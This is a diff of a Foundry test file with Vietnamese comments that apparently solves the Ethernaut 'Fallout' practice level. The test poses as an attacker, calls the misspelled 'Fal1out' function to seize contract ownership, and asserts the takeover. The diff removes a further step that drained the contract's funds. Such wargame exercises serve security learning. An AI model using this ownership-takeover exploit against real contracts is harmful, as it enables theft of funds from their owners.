@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+//pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
 import "../src/Fallout.sol"; // Đường dẫn đến file code của bạn
@@ -15,25 +16,17 @@ contract FalloutTest is Test {
     }
 
     function testExploit() public {
-        // Bắt đầu đóng vai người tấn công
         vm.startPrank(attacker);
 
-        // Bước 1: Gọi hàm viết sai tên để chiếm quyền Owner
-        // Chúng ta không gọi constructor, chúng ta gọi một hàm public bình thường
-        fallout.Fal1out{value: 0.1 ether}();
+        // Gán tiền cho attacker để có cái mà gửi đi
+        vm.deal(attacker, 1 ether);
 
-        // Kiểm tra xem đã là owner chưa
+        // QUAN TRỌNG: Tên hàm phải khớp chính xác với file Fallout.sol của bạn
+        // Nếu trong src bạn để Fal1out (số 1) thì ở đây phải là Fal1out
+        fallout.Fal1out{value: 0.0001 ether}();
+
+        // Kiểm tra owner
         assertEq(fallout.owner(), attacker);
-        console.log("Da chiem quyen Owner thanh cong!");
-
-        // Bước 2: Rút sạch tiền
-        uint256 balanceBefore = attacker.balance;
-        fallout.collectAllocations();
-
-        // Kiểm tra xem tiền đã về ví chưa
-        assertEq(address(fallout).balance, 0);
-        assertTrue(attacker.balance > balanceBefore);
-        console.log("Da rut sach tien khoi contract!");
 
         vm.stopPrank();
     }
